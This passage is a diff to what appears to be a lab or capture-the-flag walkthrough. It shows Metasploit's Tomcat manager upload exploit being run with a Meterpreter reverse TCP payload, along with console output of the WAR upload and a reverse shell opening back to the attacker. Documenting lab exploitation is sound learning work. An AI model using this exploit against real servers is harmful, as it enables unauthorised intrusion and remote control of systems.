@@ -495,5 +495,25 @@ Payload options (java/meterpreter/reverse_tcp):
    LHOST  tun0             yes       The listen address (an interface may be specified)
    LPORT  4444             yes       The listen port
 ```
+- Once all options are set, run exploit
 
+```
+msf6 exploit(multi/http/tomcat_mgr_upload) > exploit 
+
+[*] Started reverse TCP handler on 10.13.6.58:4444 
+[*] Retrieving session ID and CSRF token...
+[*] Uploading and deploying nBssnGuGRT3tMUBO2mGB...
+[*] Executing nBssnGuGRT3tMUBO2mGB...
+[*] Sending stage (58829 bytes) to 10.10.208.216
+[*] Undeploying nBssnGuGRT3tMUBO2mGB ...
+[*] Undeployed at /manager/html/undeploy
+[*] Meterpreter session 1 opened (10.13.6.58:4444 -> 10.10.208.216:34444) at 2022-12-04 19:01:06 -0500
+
+meterpreter > 
+````
+- Now we have meterpreter 
+
+### **Meterpreter Commands**
+
+- Reference https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
 
